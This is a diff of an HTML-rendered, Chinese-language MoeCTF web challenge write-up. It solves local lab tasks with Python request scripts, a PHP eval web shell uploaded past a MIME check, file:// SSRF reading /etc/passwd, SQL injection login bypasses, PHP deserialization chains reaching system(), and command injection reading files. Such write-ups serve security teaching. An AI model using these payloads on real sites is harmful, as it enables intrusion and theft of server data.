+  <span class="s2">&quot;anonymous&quot;</span><span class="p">:</span> <span class="s2">&quot;false&quot;</span>
+<span class="p">}</span>
 
-headers = {
-    'Content-Type': &quot;application/json&quot;
-}
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span>
+<span class="p">}</span>
 
-for i in range(300):
-    response = requests.post(url=url, json=data, headers=headers)
-    print(i)
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">300</span><span class="p">):</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
 
-print(response.text)
-</code></pre>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
 <p>抓一次提交的数据之后写出如上请求，刷新页面得到 flag：<code>moectf{C0NgR4Tul@TI0ns_0N-bECoMlnG_a-I1CKINg-DOg99}</code></p>
 <h4 id="_19">弗拉格之地的挑战</h4>
 <p>跳转 flag1ab.html，审查元素得到 flag1: bW9lY3Rm</p>
 <p>跳转 flag2hh.php，在响应标头中得到 flag2: e0FmdEV</p>
 <p>跳转 flag3cad.php，执行如下代码得到 flag3: yX3RoMXN</p>
-<pre><code class="language-python">import requests
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
 
-url = 'http://127.0.0.1:4419/flag3cad.php?a=1'
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:4419/flag3cad.php?a=1&#39;</span>
 
-data = {
-    'b': 1
-}
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">}</span>
 
-cookies = {
-    'verify': 'admin'
-}
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;verify&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span>
+<span class="p">}</span>
 
-response = requests.post(url, data=data, cookies=cookies)
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
 
-print(response.text)
-</code></pre>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
 <p>跳转 flag4bbc.php，在 HackBar 插件内修改 Referer 请求头为 <code>http://localhost:8080/flag3cad.php?a=1</code>，审查元素手动添加第九个按钮并在开始后按下，在控制台中得到 flag4: fdFVUMHJ。</p>
 <p>跳转 flag5sxr.php，执行如下代码，得到 flag5: fSV90aDF。</p>
-<pre><code class="language-python">import requests
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
 
-url = 'http://127.0.0.1:4419/flag5sxr.php'
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:4419/flag5sxr.php&#39;</span>
 
-data = {
-    'content': 'I want flag'  # flag5
-}
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="s1">&#39;I want flag&#39;</span>  <span class="c1"># flag5</span>
+<span class="p">}</span>
 
-response = requests.post(url=url, data=data)
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 
-print(response.text)
-</code></pre>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
 <p>跳转 flag6diw.php，审计 PHP 代码得知需要 GET 和 POST 一个 moe 参数，其中 GET 的 moe 参数的值不能严格匹配上 flag，但是要忽略大小写匹配上 flag，因此用如下代码得到 flag6: rZV9VX2t。</p>
-<pre><code class="language-python">import requests
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
 
-url = 'http://127.0.0.1:4419/flag6diw.php?moe=Flag'
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:4419/flag6diw.php?moe=Flag&#39;</span>
 
-data = {
-    'moe': 1
-}
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;moe&#39;</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">}</span>
 
-response = requests.post(url=url, data=data)
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 
-print(response.text)
-</code></pre>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
 <p>跳转 flag7fxxkfinal.php，向其 POST 的 what 参数会被 PHP 执行，因此调用 PHP 的调用系统命令的命令，在多次 ls 后写出如下脚本得到 flag7: rbm93X1dlQn0=。</p>
-<pre><code class="language-python">import requests
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
 
-url = &quot;http://127.0.0.1:4419/flag7fxxkfinal.php&quot;
-data = {
-    &quot;what&quot;: &quot;system('cat ../../../tmp/flag7');&quot;
-}
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1:4419/flag7fxxkfinal.php&quot;</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;what&quot;</span><span class="p">:</span> <span class="s2">&quot;system(&#39;cat ../../../tmp/flag7&#39;);&quot;</span>
+<span class="p">}</span>
 
-response = requests.post(url, data=data)
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 
-print(response.text)
-</code></pre>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
 <p>拼接所有的 flag，得到 <code>bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=</code>，丢进 CyberChef 使用 magic 得到 flag：<code>moectf{AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB}</code>。</p>
 <h4 id="imagecloud">ImageCloud前置</h4>
 <p>将 php 丢给 GPT 审计，得到如下信息：</p>
-<blockquote>
-<p>[!info]
-cURL 的配置，可能允许使用 <code>file://</code> 协议读取服务器的本地文件。</p>
-</blockquote>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>cURL 的配置，可能允许使用 <code>file://</code> 协议读取服务器的本地文件。</p>
+</div>
 <p>访问 http://127.0.0.1:6854/index.php?url=file:///etc/passwd ，得到 flag：<code>moectf{I-aM-VeRy-SORry-4b0UT-TH151942cf97}</code>。</p>
 <h4 id="02">垫刀之路02: 普通的文件上传</h4>
 <p>上传 php 一句话木马。</p>
-<pre><code class="language-php">&lt;?php @eval($_GET['cmd']); ?&gt;
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
 <p>然后访问 <code>http://127.0.0.1:9185/uploads/php_hack.php?cmd=system(%27env%27);</code>，得到 flag：<code>moectf{Up1O4D_YOUr-PaYl0Ad_aNd_d0_what-Y0Ur_WaNt827}</code>。</p>
 <h4 id="03">垫刀之路03: 这是一个图床</h4>
 <p>先用 BurpSuite 的浏览器在垫刀之路 02 上传时抓个包。</p>
-<pre><code class="language-plaintext">POST /upload.php HTTP/1.1
+<div class="highlight"><pre><span></span><code>POST /upload.php HTTP/1.1
 Host: 127.0.0.1:9518
 Content-Length: 230
 sec-ch-ua: &quot;Not;A=Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;128&quot;
@@ -4161,11 +4200,11 @@ Connection: keep-alive
 Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;php_hack.php&quot;
 Content-Type: application/octet-stream
 
-&lt;?php @eval($_GET['cmd']); ?&gt;
+&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;
 ------WebKitFormBoundaryUBDAGvGQpGUuanjA--
-</code></pre>
+</code></pre></div>
 <p>再在本题环境上传个图片抓个包。</p>
-<pre><code class="language-plaintext">POST /upload.php HTTP/1.1
+<div class="highlight"><pre><span></span><code>POST /upload.php HTTP/1.1
 Host: 127.0.0.1:5499
 Content-Length: 838
 sec-ch-ua: &quot;Not;A=Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;128&quot;
@@ -4190,9 +4229,9 @@ Content-Type: image/jpeg
 
 ��������������������
 ------WebKitFormBoundary68MhvlQ0R2yXKV7r--
-</code></pre>
+</code></pre></div>
 <p>对后一个选择 <code>Send to Repeater</code>，然后改一下写成如下样子，再访问 <code>http://127.0.0.1:5499/uploads/php_hack.php?cmd=system(%27env%27);</code> 即可拿到 flag：<code>moectf{Byp@Ss_THe_mIME-typE-4nd_eXt3n5lOn_yoU-C4N_do-1T3}</code>。</p>
-<pre><code class="language-plaintext">POST /upload.php HTTP/1.1
+<div class="highlight"><pre><span></span><code>POST /upload.php HTTP/1.1
 Host: 127.0.0.1:5499
 Content-Length: 216
 sec-ch-ua: &quot;Not;A=Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;128&quot;
@@ -4215,9 +4254,9 @@ Connection: keep-alive
 Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;php_hack.php&quot;
 Content-Type: image/jpeg
 
-&lt;?php @eval($_GET['cmd']); ?&gt;
+&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;
 ------WebKitFormBoundary68MhvlQ0R2yXKV7r--
-</code></pre>
+</code></pre></div>
 <h4 id="05">垫刀之路05: 登陆网站</h4>
 <p>用户名 <code>admin123 ' #</code>，密码任意，通过 SQL 注入得到 flag：<code>moectf{HaVE-THe_UseFuL_Pas5WOrd_@nd_G0-3verYwH3Re-0nLy_5Ql_can_do0}</code>。</p>
 <h4 id="06-pop-base-mini-moe">垫刀之路06: pop base mini moe</h4>
@@ -4228,39 +4267,39 @@ Content-Type: image/jpeg
 </ul>
 <p>那我们只需让 A 类实例自毁时调用 a 属性（即 B 类实例），传入的 evil 参数作为 B 类实例的 b 属性方法（即 system 函数）的参数执行，由此实现 RCE。</p>
 <p>构造 payload：</p>
-<pre><code class="language-php">&lt;?php
-class A {
-    private $evil;
-    private $a;
-}
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$evil</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$a</span><span class="p">;</span>
+<span class="p">}</span>
 
-class B {
-    private $b;
-}
+<span class="k">class</span> <span class="nc">B</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$b</span><span class="p">;</span>
+<span class="p">}</span>
 
-// B类的b属性是 system 函数，同时用反射把 private 改成 public
-$b = new B();
-$bReflection = new ReflectionClass($b);
-$bProperty = $bReflection-&gt;getProperty('b');
-$bProperty-&gt;setAccessible(true);
-// 将b对象的b属性改成system函数，此时调用b对象会调用b方法传参
-$bProperty-&gt;setValue($b, 'system');
+<span class="c1">// B类的b属性是 system 函数，同时用反射把 private 改成 public</span>
+<span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">B</span><span class="p">();</span>
+<span class="nv">$bReflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+<span class="nv">$bProperty</span> <span class="o">=</span> <span class="nv">$bReflection</span><span class="o">-&gt;</span><span class="na">getProperty</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="p">);</span>
+<span class="nv">$bProperty</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="c1">// 将b对象的b属性改成system函数，此时调用b对象会调用b方法传参</span>
+<span class="nv">$bProperty</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">);</span>
 
-// A类的a属性是B类的实例，evil属性是我们要执行的命令
-$a = new A();
-$aReflection = new ReflectionClass($a);
-$aPropertyA = $aReflection-&gt;getProperty('a');
-$aPropertyA-&gt;setAccessible(true);
-$aPropertyA-&gt;setValue($a, $b);      // 将a对象的a属性改成b对象。
+<span class="c1">// A类的a属性是B类的实例，evil属性是我们要执行的命令</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
+<span class="nv">$aReflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="nv">$aPropertyA</span> <span class="o">=</span> <span class="nv">$aReflection</span><span class="o">-&gt;</span><span class="na">getProperty</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+<span class="nv">$aPropertyA</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nv">$aPropertyA</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>      <span class="c1">// 将a对象的a属性改成b对象。</span>
 
-$aPropertyEvil = $aReflection-&gt;getProperty('evil');
-$aPropertyEvil-&gt;setAccessible(true);
-// 将a对象的evil属性改成想执行的命令，比如 'ls', 'whoami' 等。
-$aPropertyEvil-&gt;setValue($a, 'env'); 
+<span class="nv">$aPropertyEvil</span> <span class="o">=</span> <span class="nv">$aReflection</span><span class="o">-&gt;</span><span class="na">getProperty</span><span class="p">(</span><span class="s1">&#39;evil&#39;</span><span class="p">);</span>
+<span class="nv">$aPropertyEvil</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="c1">// 将a对象的evil属性改成想执行的命令，比如 &#39;ls&#39;, &#39;whoami&#39; 等。</span>
+<span class="nv">$aPropertyEvil</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="s1">&#39;env&#39;</span><span class="p">);</span> 
 
-echo urlencode(serialize($a));
-</code></pre>
-<p>访问 <code>http://127.0.0.1:4856/?data=O%3A1%3A%22A%22%3A2%3A%7Bs%3A7%3A%22%00A%00evil%22%3Bs%3A3%3A%22env%22%3Bs%3A4%3A%22%00A%00a%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A4%3A%22%00B%00b%22%3Bs%3A6%3A%22system%22%3B%7D%7D</code> 得
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</code></pre></div>
+<p>访问 <code>http://127.0.0.1:4856/?data=O%3A1%3A%22A%22%3A2%3A%7Bs%3A7%3A%22%00A%00evil%22%3Bs%3A3%3A%22env%22%3Bs%3A4%3A%22%00A%00a%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A4%3A%22%00B%00b%22%3Bs%3A6%3A%22system%22%3B%7D%7D</code> 得<br />
 到 flag：<code>moectf{Ple4se-KiCK-CfbB_63c@us3_HE-r@1se_p0pm0E-in_WEEk1_haha0}</code>。</p>
 <p>改良：可以通过覆写构造方法来不用反射构造 payload，另外，<strong>如果有字符串和某个全局函数的名字相同，可以直接用它来调用该函数</strong>，据此可实现一部分绕过。</p>
 <h4 id="07">垫刀之路07: 泄漏的密码</h4>
@@ -4271,27 +4310,27 @@ echo urlencode(serialize($a));
 <p>抓到名为 get/?id=1-53 的 json 格式数据，得到信息：<code>"flag": "Please turn to final1l1l_challenge.php"</code>，访问得到 php 代码。</p>
 <p>审计代码，该代码要求 GET 参数 a，POST 参数 b，如果 a, b 均非空且均不是数字，以及 <code>a==0</code>，a 的 md5 等于 <code>b[a]</code> 即可拿到 flag。</p>
 <p>由此我们可以让 a=0ab，<code>b[0ab]: 0aa69098421afb3fed2179a9ac2f39de</code> 作为一个数组。此时两者均不是数字，且 <code>a==0</code>（比较时会自动忽略后面），并且 <code>b[a]</code> 恰好就是 0ab 的 md5。</p>
-<pre><code class="language-python">import requests
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
 
-# Get
-url = &quot;http://127.0.0.1:6060/final1l1l_challenge.php?a=0ab&quot;
+<span class="c1"># Get</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1:6060/final1l1l_challenge.php?a=0ab&quot;</span>
 
-# Post
-data = {
-    'b[0ab]':'0aa69098421afb3fed2179a9ac2f39de'
-}
+<span class="c1"># Post</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;b[0ab]&#39;</span><span class="p">:</span><span class="s1">&#39;0aa69098421afb3fed2179a9ac2f39de&#39;</span>
+<span class="p">}</span>
 
-response = requests.post(url, data=data)
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 
-# 输出响应内容
-print(response.text)
-</code></pre>
+<span class="c1"># 输出响应内容</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
 <p>执行拿到 flag：<code>moectf{Is_MY-W1f3_PIO-Ch4n_cute-oR-YouR-WiFE-lS-Php?135}</code>。</p>
 <h4 id="_backend">电院_Backend</h4>
 <p>查 robots.txt 得到后台地址 /admin/，将附件丢给 GPT 反复拷打得到注入语句。</p>
 <p>账号：</p>
-<pre><code class="language-sql">' UNION SELECT 1, 'admin@example.com', 'd41d8cd98f00b204e9800998ecf8427e' -- 
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; UNION SELECT 1, &#39;</span><span class="k">admin</span><span class="o">@</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="s1">&#39;, &#39;</span><span class="n">d41d8cd98f00b204e9800998ecf8427e</span><span class="err">&#39;</span><span class="w"> </span><span class="c1">-- </span>
+</code></pre></div>
 <p>密码：<code>d41d8cd98f00b204e9800998ecf8427e</code>。</p>
 <p>原理：这个注入通过 <code>UNION SELECT</code> 伪造出一个返回的合法记录，密码是空字符串的MD5（<code>d41d8cd98f00b204e9800998ecf8427e</code>）。</p>
 <p>得到 flag：<code>moectf{1_dlD-Not_exPECt-y0u_TO_b3-5O_StRONg6e301}</code>。</p>
@@ -4324,211 +4363,211 @@ print(response.text)
 <li>效果：evvval 方法在上文被调用，传入的是 class003 对象，其会自动被转换成 mystr。</li>
 </ul>
 <p><strong>序列化代码</strong></p>
-<pre><code class="language-php">&lt;?php
-class class000 {
-    private $payl0ad = 0;
-    protected $what;
-}
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">class000</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$payl0ad</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$what</span><span class="p">;</span>
+<span class="p">}</span>
 
-class class001 {
-    public $payl0ad;
-    public $a;
-}
+<span class="k">class</span> <span class="nc">class001</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$payl0ad</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+<span class="p">}</span>
 
-class class002 {
-    private $sec;
-}
+<span class="k">class</span> <span class="nc">class002</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$sec</span><span class="p">;</span>
+<span class="p">}</span>
 
-class class003 {
-    public $mystr;
-}
+<span class="k">class</span> <span class="nc">class003</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$mystr</span><span class="p">;</span>
+<span class="p">}</span>
 
-$c3 = new class003();
-$c3Reflection = new ReflectionClass($c3);
-$c3Property = $c3Reflection-&gt;getProperty('mystr');
-$c3Property-&gt;setAccessible(true);
-$c3Property-&gt;setValue($c3, 'print_r($_ENV);');
+<span class="nv">$c3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">class003</span><span class="p">();</span>
+<span class="nv">$c3Reflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$c3</span><span class="p">);</span>
+<span class="nv">$c3Property</span> <span class="o">=</span> <span class="nv">$c3Reflection</span><span class="o">-&gt;</span><span class="na">getProperty</span><span class="p">(</span><span class="s1">&#39;mystr&#39;</span><span class="p">);</span>
+<span class="nv">$c3Property</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nv">$c3Property</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="nv">$c3</span><span class="p">,</span> <span class="s1">&#39;print_r($_ENV);&#39;</span><span class="p">);</span>
 
-$c2 = new class002();
-$c2Reflection = new ReflectionClass($c2);
-$c2Property = $c2Reflection-&gt;getProperty('sec');
-$c2Property-&gt;setAccessible(true);
-$c2Property-&gt;setValue($c2, $c3);
+<span class="nv">$c2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">class002</span><span class="p">();</span>
+<span class="nv">$c2Reflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$c2</span><span class="p">);</span>
+<span class="nv">$c2Property</span> <span class="o">=</span> <span class="nv">$c2Reflection</span><span class="o">-&gt;</span><span class="na">getProperty</span><span class="p">(</span><span class="s1">&#39;sec&#39;</span><span class="p">);</span>
+<span class="nv">$c2Property</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nv">$c2Property</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="nv">$c2</span><span class="p">,</span> <span class="nv">$c3</span><span class="p">);</span>
 
-$c1 = new class001();
-$c1Reflection = new ReflectionClass($c1);
-$c1Property1 = $c1Reflection-&gt;getProperty('a');
-$c1Property2 = $c1Reflection-&gt;getProperty('payl0ad');
-$c1Property1-&gt;setAccessible(true);
-$c1Property2-&gt;setAccessible(true);
-$c1Property1-&gt;setValue($c1, $c2);
-$c1Property2-&gt;setValue($c1, &quot;dangerous&quot;);
+<span class="nv">$c1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">class001</span><span class="p">();</span>
+<span class="nv">$c1Reflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$c1</span><span class="p">);</span>
+<span class="nv">$c1Property1</span> <span class="o">=</span> <span class="nv">$c1Reflection</span><span class="o">-&gt;</span><span class="na">getProperty</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+<span class="nv">$c1Property2</span> <span class="o">=</span> <span class="nv">$c1Reflection</span><span class="o">-&gt;</span><span class="na">getProperty</span><span class="p">(</span><span class="s1">&#39;payl0ad&#39;</span><span class="p">);</span>
+<span class="nv">$c1Property1</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nv">$c1Property2</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nv">$c1Property1</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="nv">$c1</span><span class="p">,</span> <span class="nv">$c2</span><span class="p">);</span>
+<span class="nv">$c1Property2</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="nv">$c1</span><span class="p">,</span> <span class="s2">&quot;dangerous&quot;</span><span class="p">);</span>
 
-$c0 = new class000();
-$c0Reflection = new ReflectionClass($c0);
-$c0Property1 = $c0Reflection-&gt;getProperty('payl0ad');
-$c0Property1-&gt;setAccessible(true);
-$c0Property1-&gt;setValue($c0, 1);
-$c0Property2 = $c0Reflection-&gt;getProperty('what');
-$c0Property2-&gt;setAccessible(true);
-$c0Property2-&gt;setValue($c0, $c1);
+<span class="nv">$c0</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">class000</span><span class="p">();</span>
+<span class="nv">$c0Reflection</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$c0</span><span class="p">);</span>
+<span class="nv">$c0Property1</span> <span class="o">=</span> <span class="nv">$c0Reflection</span><span class="o">-&gt;</span><span class="na">getProperty</span><span class="p">(</span><span class="s1">&#39;payl0ad&#39;</span><span class="p">);</span>
+<span class="nv">$c0Property1</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nv">$c0Property1</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="nv">$c0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nv">$c0Property2</span> <span class="o">=</span> <span class="nv">$c0Reflection</span><span class="o">-&gt;</span><span class="na">getProperty</span><span class="p">(</span><span class="s1">&#39;what&#39;</span><span class="p">);</span>
+<span class="nv">$c0Property2</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nv">$c0Property2</span><span class="o">-&gt;</span><span class="na">setValue</span><span class="p">(</span><span class="nv">$c0</span><span class="p">,</span> <span class="nv">$c1</span><span class="p">);</span>
 
-echo urlencode(serialize($c0));
-?&gt;
-</code></pre>
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$c0</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
 <p>访问 http://127.0.0.1:12988/?data=O%3A8%3A%22class000%22%3A2%3A%7Bs%3A17%3A%22%00class000%00payl0ad%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00what%22%3BO%3A8%3A%22class001%22%3A2%3A%7Bs%3A7%3A%22payl0ad%22%3Bs%3A9%3A%22dangerous%22%3Bs%3A1%3A%22a%22%3BO%3A8%3A%22class002%22%3A1%3A%7Bs%3A13%3A%22%00class002%00sec%22%3BO%3A8%3A%22class003%22%3A1%3A%7Bs%3A5%3A%22mystr%22%3Bs%3A15%3A%22print_r%28%24_ENV%29%3B%22%3B%7D%7D%7D%7D 得到 flag：<code>moectf{1T_s3ems-tH4t-YOu-KNoW_WH4t-iS-pop_ln-phPPPpPPP!!!67}</code>。</p>
 <p>改良：将 <code>class000</code> 的 what 属性改为 <code>phpinfo</code>，可以直接执行该命令获得环境变量。</p>
 <h4 id="_21">勇闯铜人阵</h4>
 <p>闯关弟子注意，本关考验你写爬虫脚本的功夫。</p>
-<pre><code class="language-python">import requests
-from bs4 import BeautifulSoup
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
 
-url = &quot;http://127.0.0.1:13944&quot;
-data = {
-    &quot;player&quot;: &quot;1&quot;,
-    &quot;direct&quot;: &quot;弟子明白&quot;
-}
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1:13944&quot;</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;player&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;direct&quot;</span><span class="p">:</span> <span class="s2">&quot;弟子明白&quot;</span>
+<span class="p">}</span>
 
-dict = {
-    &quot;1&quot;: &quot;北方&quot;,
-    &quot;2&quot;: &quot;东北方&quot;,
-    &quot;3&quot;: &quot;东方&quot;,
-    &quot;4&quot;: &quot;东南方&quot;,
-    &quot;5&quot;: &quot;南方&quot;,
-    &quot;6&quot;: &quot;西南方&quot;,
-    &quot;7&quot;: &quot;西方&quot;,
-    &quot;8&quot;: &quot;西北方&quot;
-}
+<span class="nb">dict</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;1&quot;</span><span class="p">:</span> <span class="s2">&quot;北方&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;2&quot;</span><span class="p">:</span> <span class="s2">&quot;东北方&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;3&quot;</span><span class="p">:</span> <span class="s2">&quot;东方&quot;</span><span class="p">,</span>
